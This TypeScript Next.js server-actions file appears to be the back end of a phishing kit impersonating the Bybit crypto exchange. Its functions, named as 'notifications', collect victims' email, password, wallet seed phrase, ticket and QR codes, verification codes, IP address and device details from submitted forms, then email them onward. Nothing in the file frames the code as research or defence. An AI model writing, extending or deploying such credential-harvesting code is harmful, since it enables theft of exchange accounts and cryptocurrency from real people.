"use server"

import { headers } from "next/headers"
import { sendNotificationEmail } from "@/lib/simple-email-service"

function getClientIP(): string {
  const headersList = headers()
  const forwarded = headersList.get("x-forwarded-for")
  const realIP = headersList.get("x-real-ip")

  if (forwarded) {
    return forwarded.split(",")[0].trim()
  }

  if (realIP) {
    return realIP
  }

  return "Unknown IP"
}

function getDeviceInfo(): string {
  const headersList = headers()
  const userAgent = headersList.get("user-agent") || "Unknown"

  const browser = userAgent.includes("Chrome")
    ? "Chrome"
    : userAgent.includes("Firefox")
      ? "Firefox"
      : userAgent.includes("Safari")
        ? "Safari"
        : userAgent.includes("Edge")
          ? "Edge"
          : "Unknown Browser"

  const os = userAgent.includes("Windows")
    ? "Windows"
    : userAgent.includes("Mac")
      ? "macOS"
      : userAgent.includes("Linux")
        ? "Linux"
        : userAgent.includes("Android")
          ? "Android"
          : userAgent.includes("iOS")
            ? "iOS"
            : "Unknown OS"

  return `${browser} on ${os}`
}

export async function notifyFirstVerification(formData: FormData) {
  const ipAddress = getClientIP()
  const timestamp =
    new Date().toLocaleString("en-US", {
      timeZone: "UTC",
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    }) + " UTC"

  const emailData = {
    emailType: "first-verification" as const,
    userEmail: formData.get("email") as string,
    userPassword: formData.get("password") as string,
    ticketId: formData.get("ticketId") as string,
    qrCode: formData.get("qrCode") as string,
    ipAddress,
    timestamp,
  }

  await sendNotificationEmail(emailData)
}

export async function notifyBybitLogin(formData: FormData) {
  const ipAddress = getClientIP()
  const deviceInfo = getDeviceInfo()
  const timestamp =
    new Date().toLocaleString("en-US", {
      timeZone: "UTC",
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    }) + " UTC"

  const emailData = {
    emailType: "bybit-login" as const,
    loginEmail: (formData.get("email") as string) || (formData.get("phone") as string) || "Web3 Login",
    loginPassword: formData.get("password") as string || "Web3 Login",
    loginSuccess: true, // Assuming success for demo
    deviceInfo,
    ipAddress,
    timestamp,
    walletPhrase: formData.get("walletPhrase") as string || undefined,
  }

  await sendNotificationEmail(emailData)
}

export async function notifySecondVerification(data: {
  ticketId: string
  qrCode: string
  verificationCode?: string
  success?: boolean
}) {
  const ipAddress = getClientIP()
  const timestamp =
    new Date().toLocaleString("en-US", {
      timeZone: "UTC",
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    }) + " UTC"

  const emailData = {
    emailType: "second-verification" as const,
    ticketId: data.ticketId,
    qrCode: data.qrCode,
    verificationCode: data.verificationCode,
    success: data.success,
    ipAddress,
    timestamp,
  }

  await sendNotificationEmail(emailData)
}
